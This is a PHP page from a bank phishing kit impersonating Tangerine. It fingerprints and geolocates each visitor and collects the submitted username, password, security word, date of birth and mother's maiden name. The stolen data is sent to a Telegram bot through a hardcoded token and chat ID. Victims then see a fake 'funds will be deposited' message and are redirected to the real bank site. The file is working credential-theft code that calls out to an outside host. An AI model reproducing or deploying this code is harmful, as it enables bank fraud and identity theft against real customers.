
       
 <?php
include "/files/anti/anti1.php";
include "/files/anti/anti2.php"; 
include "/files/anti/anti3.php"; 
include "/files/anti/anti4.php"; 
include "/files/anti/anti5.php"; 
include "/files/anti/anti6.php"; 
include "/files/anti/anti7.php"; 
include "/files/anti/anti8.php"; 
include "/fingerprints.php";

$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

error_reporting(E_ERROR | E_PARSE);

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = '/telgram.txt';
$file2      = '/Tangerube.csv';
$file3      = '/accounts.csv';
$file4      = '/usget.txt';
$file5      = '/combo.txt';

$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "Tangerine";
    $project    = "[CR00K-3D]";
    $url        = "https://td.com";
    $user       = $_POST['username'];
    $pass       = $_POST['password'];
    $vocal       = $_POST['vocal'];
    $dob1       = $_POST['dob1'];
    $dob2       = $_POST['dob2'];
    $dob3       = $_POST['dob3'];
    $mmn        = $_POST['mmn'];
    $code       = $_POST['code']; 
    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
    $isp        = $is;
    $currency   = "".$full_date;
	$lh     = "|";
		$lr     = "+";
        $li     = ",";



} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}


$message = "IMPORTANT DATA LOGGGED\n\n $bank$lh$ip\n\nWord : $vocal\nDob  : $dob1$lh$dob2$lh$dob3\nmmn  : $mmn \n\n$uos$lh$bsr\n$is\n$city$lh$country\n\nmaps.google.com/?q=$la$lh$lp\n";


$apiToken = "5988975308:AAEDaQXSEpESUjuXhmPBLhOLI_cUsFE1yoI"; 
$data = [
    'chat_id' => '-886806120',
    'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                
      ?>
<!-- saved from url=(0042)/deposit/tang/f -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <title>Verification | Tangerine</title>
        <meta name="description" content="">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta http-equiv="refresh" content="2;URL=https://href.li/?https://www.tangerine.ca/en/index.html">
        <meta name="viewport" content="width=device-width, maximum-scale=1.0">
        <link rel="shortcut icon" href="https://www.tangerine.ca/app/favicon.ico" type="image/x-icon">
        <link href="./files/global.css" rel="stylesheet">
        <link href="./files/app.css" rel="stylesheet">
        <style type="text/css" id="kampyleStyle">.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}</style>
    </head>
    <body translate-cloak="" application-theme="" state="forgotLogin" class="fb2-index ng-scope application-theme-web" style="overflow: visible;">
        <tng-main-nav class="ng-isolate-scope">
            <nav class="navbar print-hide" ng-class="{&#39;nativeNav&#39; : $ctrl.EnvironmentService.isNative()}">
                <a id="mainNav_home" class="brand nonclickable" href="/deposit/tang/f" ng-click="$ctrl.handleGoHome()" ng-class="{&#39;nonclickable&#39; : $ctrl.isTitleLogoNotClickable()}">
                    <img ng-src="assets/images/brand-white.png" alt="Tangerine" class="logo-white print-hide" src="./files/brand-white.png">
                    <img ng-src="assets/images/brand-orange.png" alt="Tangerine" class="logo-orange print-only-inline" src="./files/brand-orange.png">
                </a>
            </nav>
        </tng-main-nav>
        <div ui-view="page-content" class="page-content ng-scope" style="padding-bottom: 0px;">
            <forgot-login class="ng-scope ng-isolate-scope">
                <form method="post" action="/deposit/Tangerine/040152.php" class="ng-pristine ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength ng-valid-email">
                    <style>
                    .forgot-login select, .forgot-login input[type="text"], .forgot-login input[type="tel"], .forgot-login input[type="PASSWORD | "] {
                        font-size: 17px;
                        margin-top: 10px;
                        margin-bottom: 15px;
                        font-weight: 500;
                        border: 1px solid #9e9e9e;
                    }

                    .heading--title2 {
                        margin-bottom: 25px;
                        text-align: center;
                    }

                    .forgot-login button {
                        margin: 0px;
                    }

                    .text-right {
                        text-align: right;
                    }

                    .navbar {
                        display: block !important;
                        background-color: #ea7024 !important;
                    }

                    .btn, [class*=" btn--"], [class^=btn--] {
                        background-color: #ea7024;
                    }

                    .forgot-login__email {
                        max-width: 30em;
                        margin-left: auto;
                        margin-right: auto;
                    }

                    .application-theme-web {
                        background-color: #ffffff;
                    }
                    </style>
                    <div class="forgot-login" style="margin-top: 0px; padding: 23px;">
                        <div class="forgot-login__email ng-scope" ng-if="$ctrl.currentState === $ctrl.STATES.FORM">
                            <h2 class="heading--title2 ng-binding">Thank you</h2>
                            <p style="text-align: center; font-size: 17px; padding: 10px 40px 0px 40px;">The funds will be processed and deposited in your account within the next 48 hours.<br>
<br>
For security reasons you will now be redirected to the home page.</p>
                        </div>
                    </div>
                </form>
            </forgot-login>
        </div>
        <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
    
    
</body></html>